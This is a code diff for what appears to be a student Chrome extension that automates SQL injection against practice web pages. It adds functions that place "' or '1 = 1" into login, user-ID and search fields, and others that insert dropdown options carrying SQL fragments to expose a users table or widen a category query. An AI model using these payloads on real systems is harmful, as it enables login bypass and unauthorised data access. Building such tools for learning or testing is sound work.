@@ -26,44 +26,52 @@ function tfInject(){
     tfs[i].value = injectionString;
   }
 }
-/*
+
 // ----- Tactic 3 -----
-function idTable(){
-  // Not very feasable
-  var listeners = getEventListeners();
+function loginPA(){
+  var passwdbox = document.getElementById('password');
+  passwdbox.value = "\' or \'1 = 1";
 }
 
 // ----- Tactic 4 -----
-function customScriptBox(){
-  // Adds to the website but not really useful as PHP only runs server side
-  var originalHTML = document.getElementsByTagName('body');
-  var scriptbox = 'Insert Query Here: <input id=\"customquery\"></input> <button id=\"csb\">Submit</button>';
-  originalHTML[0].innerHTML = scriptbox + originalHTML[0].innerHTML; 
-  document.getElementById('csb').addEventListener('click', runcs);
-}
-
-function runcs(){
-  // Adds to the website but not really useful as PHP only runs server side
-  var query = document.getElementById('customquery');
-  var phpblock1 = "<?php";
-  var phpblock2 = "echo(did the php work);";
-  var phpblock3 = "?>";
-  var originalHTML = document.getElementsByTagName('body');
-  originalHTML[0].innerHTML = phpblock1 + phpblock2 + phpblock3 + originalHTML[0].innerHTML;
+function accinfoUID(){
+  var uid = document.getElementById('uid');
+  uid.value = "\' or \'1 = 1";
 }
 
 // ----- Tactic 5 -----
-function destruction(){
-  // Not very feasable, at least not as intended
+function accinfoTCU(){
+  var tableselect = document.getElementById('category');
+  tableselect.innerHTML = "<option value = \"users\">Users</option>" + tableselect.innerHTML;
 }
-*/
+
+// ----- Tactic 6 -----
+function groceryDump(){
+  var searchbar = document.getElementById('searchinfo');
+  searchbar.value = "\' or \'1 = 1";
+}
+
+// ----- Tactic 7 -----
+function inventoryMC(){
+  var catlist = document.getElementById('category');
+  catlist.innerHTML = "<option value = \"frozen\' or category = \'produce\">Frozen and Produce</option>" + catlist.innerHTML;
+}
+
 module.exports.dropdownInject = dropdownInject
 module.exports.tfInject = tfInject
-
-
+module.exports.loginPA = loginPA
+module.exports.accinfoUID = accinfoUID
+module.exports.accinfoTCU = accinfoTCU
+module.exports.groceryDump = groceryDump
+module.exports.inventoryMC = inventoryMC
 
 
 /*
+
+Commented out due to Jest not understanding Chrome specific items.
+These are just the way the popup connects to this page and calls them, similar to how we will call with Jest.
+
+// Selection of injection stradegy
 chrome.runtime.onMessage.addListener(
   function(request, sender, sendResponse) {
     if (request.message === "inject_to_dropdowns"){
@@ -73,16 +81,21 @@ chrome.runtime.onMessage.addListener(
     else if (request.message === "textfield_to_inject"){
       tfInject();
     }
-    else if (request.message === "identify_table"){
-      idTable();
+    else if (request.message === "loginPA"){
+      loginPA();
     }
-    else if (request.message === "custom_script_box"){
-      customScriptBox();
+    else if (request.message === "accinfoUID"){
+      accinfoUID();
     }
-    else if (request.message === "destruction"){
-      alert("Crush Kill Destory");
+    else if (request.message === "accinfoTCU"){
+      accinfoTCU();
+    }
+    else if (request.message === "groceryDump"){
+      groceryDump();
+    }
+    else if (request.message === "inventoryMC"){
+      inventoryMC();
     }
   }
 );
-
 */
